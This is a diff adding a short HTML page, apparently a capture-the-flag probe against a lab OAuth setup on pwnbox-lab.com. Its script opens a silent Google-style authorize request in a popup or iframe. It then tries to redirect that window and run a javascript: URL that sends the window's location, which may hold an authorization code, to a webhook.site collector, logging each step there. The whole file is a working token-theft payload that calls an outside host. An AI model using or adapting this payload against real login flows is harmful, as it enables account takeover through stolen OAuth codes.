@@ -1,0 +1,27 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>p4</title></head>
+<body>
+<script>
+const C='https://webhook.site/d6b0bb65-c7e6-43ad-9762-1804b0bb7e41';
+const APP='https://solo-leveling-referer-0a11a8c95369.pwnbox-lab.com';
+const IDP='https://google-0a11a8c95369.pwnbox-lab.com/o/oauth2/v2/auth?client_id=solo-leveling-4-client&redirect_uri='+encodeURIComponent(APP+'/callback')+'&response_type=code&scope=openid+email+profile&state=P4RANDOM&prompt=none';
+const run='p4_'+Date.now();
+function log(k,v){ try{ fetch(C+'/?probe4='+encodeURIComponent(k)+'&run='+encodeURIComponent(run)+'&v='+encodeURIComponent(v||''),{mode:'no-cors'}); }catch(e){} }
+log('loaded', location.href+'|ref='+document.referrer);
+let w=null;
+try { w=window.open(IDP,'p4win'); log('open', w?'ok':'null'); } catch(e){ log('open_ex', String(e)); }
+if(!w){
+  try {
+    const f=document.createElement('iframe'); f.id='p4f'; f.src=IDP; document.body.appendChild(f);
+    setTimeout(()=>{ try{ f.src=C+'/?probe4=iframe_nav&run='+encodeURIComponent(run); }catch(e){} }, 5000);
+    log('iframe','created');
+  } catch(e){ log('iframe_ex', String(e)); }
+}
+if(w){
+  setTimeout(()=>{ try{ w.location=C+'/?probe4=nav&run='+encodeURIComponent(run); log('nav','set'); }catch(e){ log('nav_ex', String(e)); } }, 5000);
+  setTimeout(()=>{ try{ w.location='javascript:fetch("'+C+'/?probe4=js&run='+encodeURIComponent(run)+'&u="+encodeURIComponent(location.href),{mode:"no-cors"})'; log('jsnav','set'); }catch(e){ log('jsnav_ex', String(e)); } }, 8000);
+  setTimeout(()=>{ try{ w.location=APP+'/'; log('rootnav','set'); }catch(e){} }, 11000);
+}
+setTimeout(()=>{ log('alive',''); }, 14000);
+</script>
+</body></html>
